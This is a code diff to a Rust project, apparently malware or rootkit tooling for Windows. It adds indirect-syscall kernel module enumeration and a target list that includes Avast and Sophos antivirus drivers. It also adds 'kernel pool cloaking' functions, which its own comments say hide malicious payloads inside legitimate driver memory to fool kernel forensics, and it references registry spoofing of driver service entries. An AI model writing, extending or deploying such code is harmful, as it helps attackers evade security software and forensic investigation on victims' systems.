@@ -175,8 +175,237 @@ indirect_syscall!(
     rcx
 );
 
+// NtQuerySystemInformation - for kernel module enumeration
+indirect_syscall!(
+    nt_query_system_information,
+    ssn,
+    syscall_ret_addr,
+    rcx, rdx, r8, r9
+);
+
 // =============================================================================
-// REGISTRY SPOOFING
+// KERNEL STRUCTURES
+// =============================================================================
+
+#[repr(C)]
+pub struct SYSTEM_MODULE_INFORMATION {
+    pub number_of_modules: u32,
+    pub modules: [SYSTEM_MODULE; 1],  // Variable length array
+}
+
+#[repr(C)]
+pub struct SYSTEM_MODULE {
+    pub section: *mut c_void,
+    pub mapped_base: *mut c_void,
+    pub image_base: *mut c_void,
+    pub image_size: u32,
+    pub flags: u32,
+    pub load_order: u16,
+    pub init_order: u16,
+    pub load_count: u16,
+    pub offset_to_file: u16,
+    pub reserved: [u32; 4],
+    pub full_path: [u16; 256],  // UNICODE_STRING-ish
+}
+
+// =============================================================================
+// KERNEL POOL CLOAKING
+// =============================================================================
+
+/// Passive driver targets for kernel pool cloaking.
+/// These are commonly loaded but typically idle drivers that can be used
+/// to hide malicious payloads in their memory space.
+pub const PASSIVE_DRIVER_TARGETS: &[&str] = &[
+    "\\SystemRoot\\System32\\drivers\\aswsp.sys",      // Avast
+    "\\SystemRoot\\System32\\drivers\\aswchmon.sys",   // Avast
+    "\\SystemRoot\\System32\\drivers\\aswengmon.sys",  // Avast
+    "\\SystemRoot\\System32\\drivers\\aswfw.sys",      // Avast
+    "\\SystemRoot\\System32\\drivers\\savonaccess.sys", // Sophos
+    "\\SystemRoot\\System32\\drivers\\savscan.sys",    // Sophos
+    "\\SystemRoot\\System32\\drivers\\nvvad.sys",      // NVIDIA Audio
+    "\\SystemRoot\\System32\\drivers\\nvhda.sys",      // NVIDIA Audio
+    "\\SystemRoot\\System32\\drivers\\rtkv32.sys",     // Realtek
+    "\\SystemRoot\\System32\\drivers\\rtkv64.sys",     // Realtek
+    "\\SystemRoot\\System32\\drivers\\swenum.sys",     // USB SW Enum
+    "\\SystemRoot\\System32\\drivers\\usbhub.sys",     // USB Hub
+    "\\SystemRoot\\System32\\drivers\\ksthrough.sys",  // Kernel Streaming
+];
+
+/// Query kernel modules via NtQuerySystemInformation indirect syscall.
+/// Returns list of loaded kernel modules with their base addresses and sizes.
+#[inline(never)]
+pub unsafe fn enumerate_kernel_modules(sc_query: &IndirectSyscall) -> Option<Vec<SYSTEM_MODULE>> {
+    let mut buffer_size: u32 = 0;
+    
+    // First call to get required buffer size
+    let _ = nt_query_system_information(
+        sc_query,
+        11,  // SystemModuleInformation
+        std::ptr::null_mut(),
+        0,
+        &mut buffer_size as *mut _ as *mut c_void,
+    );
+    
+    if buffer_size == 0 {
+        return None;
+    }
+    
+    // Allocate buffer
+    let buffer = crate::windows::alloc_readwrite(buffer_size as usize)?;
+    if buffer.is_null() {
+        return None;
+    }
+    
+    // Query system modules
+    let status = nt_query_system_information(
+        sc_query,
+        11,  // SystemModuleInformation
+        buffer,
+        buffer_size,
+        &mut buffer_size as *mut _ as *mut c_void,
+    );
+    
+    if status != 0 || buffer.is_null() {
+        crate::windows::free(buffer, buffer_size as usize);
+        return None;
+    }
+    
+    // Parse SYSTEM_MODULE_INFORMATION
+    let info = buffer as *const SYSTEM_MODULE_INFORMATION;
+    let num_modules = (*info).number_of_modules as usize;
+    
+    // Calculate actual size needed
+    let module_array_size = num_modules * std::mem::size_of::<SYSTEM_MODULE>();
+    let total_size = std::mem::size_of::<u32>() + module_array_size;
+    
+    if buffer_size as usize < total_size {
+        crate::windows::free(buffer, buffer_size as usize);
+        return None;
+    }
+    
+    // Extract modules
+    let mut modules = Vec::with_capacity(num_modules);
+    let modules_ptr = (*info).modules.as_ptr();
+    
+    for i in 0..num_modules {
+        let module_ptr = modules_ptr.add(i);
+        let module = *module_ptr;
+        
+        // Extract driver name from full_path
+        let path_slice = std::slice::from_raw_parts(
+            module.full_path.as_ptr(),
+            256
+        );
+        let path_len = path_slice.iter().position(|&c| c == 0).unwrap_or(256);
+        let path = String::from_utf16_lossy(&path_slice[..path_len]);
+        
+        // Create a proper SYSTEM_MODULE with owned data
+        let mut owned_module = module;
+        owned_module.full_path = [0; 256];
+        let path_utf16: Vec<u16> = path.encode_utf16().collect();
+        let copy_len = path_utf16.len().min(255);
+        owned_module.full_path[..copy_len].copy_from_slice(&path_utf16[..copy_len]);
+        
+        modules.push(owned_module);
+    }
+    
+    crate::windows::free(buffer, buffer_size as usize);
+    Some(modules)
+}
+
+/// Find a passive driver suitable for kernel pool cloaking.
+/// Returns the best candidate that is loaded but unlikely to be actively monitored.
+#[inline(never)]
+pub unsafe fn find_passive_driver_target(sc_query: &IndirectSyscall) -> Option<SYSTEM_MODULE> {
+    let modules = enumerate_kernel_modules(sc_query)?;
+    
+    // Priority list of driver names to look for (lower = better target)
+    let preferred_drivers = [
+        "aswsp.sys",      // Avast
+        "savonaccess.sys", // Sophos
+        "rtkv32.sys",     // Realtek
+        "rtkv64.sys",     // Realtek
+        "nvhda.sys",      // NVIDIA
+        "nvvad.sys",      // NVIDIA Audio
+        "ksthrough.sys",  // Kernel Streaming
+        "swenum.sys",     // USB
+    ];
+    
+    // First pass: look for preferred drivers
+    for target_name in preferred_drivers.iter() {
+        for module in &modules {
+            let path_slice = std::slice::from_raw_parts(
+                module.full_path.as_ptr(),
+                256
+            );
+            let path_len = path_slice.iter().position(|&c| c == 0).unwrap_or(256);
+            let path = String::from_utf16_lossy(&path_slice[..path_len]).to_lowercase();
+            
+            if path.contains(target_name) {
+                return Some(*module);
+            }
+        }
+    }
+    
+    // Second pass: look for any driver with "audio" or "usb" in path
+    for module in &modules {
+        let path_slice = std::slice::from_raw_parts(
+            module.full_path.as_ptr(),
+            256
+        );
+        let path_len = path_slice.iter().position(|&c| c == 0).unwrap_or(256);
+        let path = String::from_utf16_lossy(&path_slice[..path_len]).to_lowercase();
+        
+        if path.contains("audio") || path.contains("usb") || path.contains("hda") {
+            return Some(*module);
+        }
+    }
+    
+    // Fallback: return any driver with non-zero size
+    for module in &modules {
+        if module.image_size > 0 && !module.image_base.is_null() {
+            return Some(*module);
+        }
+    }
+    
+    None
+}
+
+/// Kernel Pool Cloaking - Hide driver payload within legitimate driver memory.
+///
+/// This function identifies a passive legitimate driver and provides
+/// the information needed to map malicious payload within its memory space,
+/// making kernel forensics show the payload as part of a legitimate driver.
+#[inline(never)]
+pub unsafe fn cloak_kernel_pool(sc_query: &IndirectSyscall) -> Option<KernelPoolCloak> {
+    let target = find_passive_driver_target(sc_query)?;
+    
+    let path_slice = std::slice::from_raw_parts(
+        target.full_path.as_ptr(),
+        256
+    );
+    let path_len = path_slice.iter().position(|&c| c == 0).unwrap_or(256);
+    let driver_path = String::from_utf16_lossy(&path_slice[..path_len]);
+    
+    Some(KernelPoolCloak {
+        target_base: target.image_base,
+        target_size: target.image_size as usize,
+        driver_path: driver_path.clone(),
+        mapped_base: target.mapped_base,
+    })
+}
+
+/// Result of kernel pool cloaking operation.
+#[repr(C)]
+pub struct KernelPoolCloak {
+    pub target_base: *mut c_void,
+    pub target_size: usize,
+    pub driver_path: String,
+    pub mapped_base: *mut c_void,
+}
+
+// =============================================================================
+// DRIVER LOADING
 // =============================================================================
 
 /// Spoof driver registry service entry as legitimate hardware device.
